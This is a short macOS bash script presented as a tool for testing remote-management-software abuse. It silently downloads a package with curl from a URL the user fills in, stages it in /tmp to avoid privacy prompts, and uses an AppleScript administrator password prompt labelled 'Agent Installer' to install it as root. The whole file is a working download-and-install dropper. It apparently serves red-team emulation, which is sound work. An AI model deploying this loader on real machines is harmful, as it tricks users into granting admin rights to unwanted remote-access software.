#!/bin/bash

# This is an sh script to download and run a pkg for RMM abuse testing, for testing RMM or other abuse on MacOS. 
# Note that sometimes just running the dmg or pkg is probably more useful, but sometimes it is fun to try different things.
# Change file extension or name, etc. as needed.
# Use only for legal and ethical testing purposes. 

# 1) URL of the .pkg
URL="(Insert Your Download Link Here)"

# 2) Stage in /tmp (world-writable, no privacy prompts)
DEST="/tmp/agent.pkg"

# 3) Download quietly (-s = silent, -S = show errors, -L = follow redirects)
if ! curl -sSL "$URL" -o "$DEST"; then
  osascript -e 'display alert "Agent Installer" message "Download failed" as critical'
  exit 1
fi

# 4) Run the installer with a GUI password prompt
osascript <<EOF
with timeout of 600 seconds
    try
        do shell script "installer -pkg '$DEST' -target /" with administrator privileges
        display notification "Agent installed successfully" with title "Agent Installer"
    on error errMsg
        display alert "Agent Installer" message errMsg as critical
        error number -128
    end try
end timeout
EOF
